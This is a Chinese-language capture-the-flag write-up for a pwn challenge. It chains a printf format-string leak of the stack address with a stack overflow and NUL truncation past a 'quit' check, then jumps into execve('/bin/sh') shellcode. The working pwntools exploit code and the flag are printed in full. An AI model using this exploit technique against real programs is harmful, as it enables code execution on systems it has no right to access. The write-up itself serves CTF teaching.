# All

## 题目简述

程序在 20 字节栈缓冲区中读取最多 256 字节，再把缓冲区直接作为 `printf` 格式串；循环直到缓冲区等于 `quit`。二进制无 PIE、无 Canary，栈可执行。需要把格式化字符串泄露与栈溢出组合起来执行 shellcode。

## 解题过程

先发送 `%p`。`read(0, buf, ...)` 返回后，SysV x86-64 ABI 的 `rsi` 仍指向 `buf`，而 `printf(buf)` 会把缺失的第一个可变参数从该寄存器取出，因此响应泄露缓冲区栈地址：

```python
p.sendline(b"%p")
buf_addr = int(p.recvline().strip(), 16)
```

覆盖保存返回地址的偏移为 40。最终输入必须以 `quit\0` 开头，让下一次循环判断结束并执行函数 epilogue；其后放 `/bin/sh\0` 与 `execve` shellcode。shellcode 位于 `buf+13`：前 5 字节是 `quit\0`，接着 8 字节是命令字符串。

```python
shellcode = asm("""
    xor rsi, rsi
    xor rdx, rdx
    mov rdi, rsp
    sub rdi, 43
    mov rax, 59
    syscall
""")

payload  = b"quit\x00/bin/sh\x00" + shellcode
payload  = payload.ljust(40, b"A")
payload += p64(buf_addr + 13)
p.sendline(payload)
```

取得 shell 后读取：

```text
byuctf{too_many_options_what_do_I_chooooooose}
```

## 方法总结

本题同时提供信息泄露、任意长度写入与可执行栈，但三者需要正确衔接。格式串先解除 ASLR 对栈地址的影响，NUL 截断让输入既满足 `strcmp("quit")` 又携带后续二进制载荷，最后覆盖返回地址跳入 shellcode。
